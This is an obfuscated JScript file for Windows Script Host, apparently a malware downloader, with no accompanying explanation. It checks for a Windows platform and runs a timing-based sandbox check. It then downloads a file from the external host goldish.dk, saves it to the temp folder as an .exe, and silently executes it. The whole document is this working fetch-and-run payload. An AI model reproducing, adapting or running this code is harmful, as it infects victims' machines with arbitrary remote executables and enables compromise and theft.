var _FC = false;
var _UL = "CreateObject";
var _WS = function _GW() {return WScript[_UL]("WScript"+".Shell");}(), _Z = 11;
var _ZV = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _K0 = 0;
function _WQ(_BX){_WS["Run"](_BX, _K0, _K0);};
function _J(){return _ZV + "";};
function _N(_LP, _WU){_K0 = _K0 * 1; return _LP - _WU;};
function _JY0(){return _UL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _FC = true;
  @end
@*/
if (_FC)
{
var _D = "";
function _GZ(){return 22;};
var _T = 0; var _Y = 0;
function _YO()
{
var _YE = new this["Date"]();
var _B = _YE["getUTCMilliseconds"]();
WScript["Sleep"](_GZ());
var _YE = new this["Date"]();
var _U = _YE["getUTCMilliseconds"]();
WScript["Sleep"](_GZ());
var _YE = new this["Date"]();
var _KE = _YE["getUTCMilliseconds"]();
var _T = "_A";
_T = _N(_U, _B);
var _Y = "_AY";
_Y = _N(_KE, _U);
_D = "open";
return _N(_T, _Y);
}
var _B0 = false;
var _W = false;
for (var _D0 = _K0; _D0 < _GZ() * 1; _D0++){if (_YO() != _K0){
_B0 = true; 
_Y = "31" + 11 * _T + _Y; 
_W = true; 
break;
}}
function _C() {return ((_B0 == true) && (_B0 == _W)) ? 1 : _K0;};
if (_B0 && _C() && _W){
function _JY() {return _WS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9FxP6tyKAo.ex" + "e";};
 _US = _J();
 _TQ = WScript[_UL](_US);
 var _H = 1;
 while (_H){
try {
	if (_H == 1)
	{
		_TQ[_D]("GET", "http://goldish.dk/o2pds", false);
		_TQ["send"]();
		_F = "Sleep";
	}
	WScript[_F](_GZ() + 120); 
	if (_TQ["readystate"] < 2 * 2) continue;
	_H = _K0;
	function _KA(_CL) {var _DY = (1, 2, 3, 4, 5, _CL); return _DY;};
	_LW = WScript[_JY0()]("ADODB.Stream");
	_US = _LW;
	_US[_D]();
	_US["type"] = _KA(1);
	_US["write"](_TQ["ResponseBody"]);
	_LW["position"] = _KA(_K0);
	_US["Save" + "ToFile"](_JY(), 2);
	_LW["cl"+"ose"]();
	_K = _JY();
	_WQ(_K);
} catch(_G){};
}
}
}

